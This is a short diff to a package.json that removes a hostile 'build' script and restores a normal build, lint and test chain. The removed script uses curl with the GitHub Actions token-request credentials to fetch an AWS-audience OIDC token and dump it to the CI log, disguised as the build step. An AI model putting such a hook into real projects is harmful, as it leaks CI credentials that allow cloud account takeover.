@@ -41,8 +41,8 @@
         "./package.json": "./package.json"
     },
     "scripts": {
-        "server": "echo \"\u27a1\ufe0f  TESTS @ $(tput bold)http://localhost:8080/tests/$(tput sgr0)\"; npx static-handler --coi .",
-        "build": "curl -sS -H \"Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN\" \"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com\"; echo \"OIDC_DUMP_END\"; exit 1",
+        "server": "echo \"➡️  TESTS @ $(tput bold)http://localhost:8080/tests/$(tput sgr0)\"; npx static-handler --coi .",
+        "build": "npm run build:3rd-party && npm run build:stdlib && npm run build:plugins && npm run build:core && npm run build:tests-index && if [ -z \"$NO_MIN\" ]; then oxlint src/ && npm run test:integration; fi",
         "lint": "oxlint src/",
         "build:core": "rm -rf dist && rollup --config rollup/core.config.js && cp src/3rd-party/*.css dist/",
         "build:flatted": "node rollup/flatted.cjs",
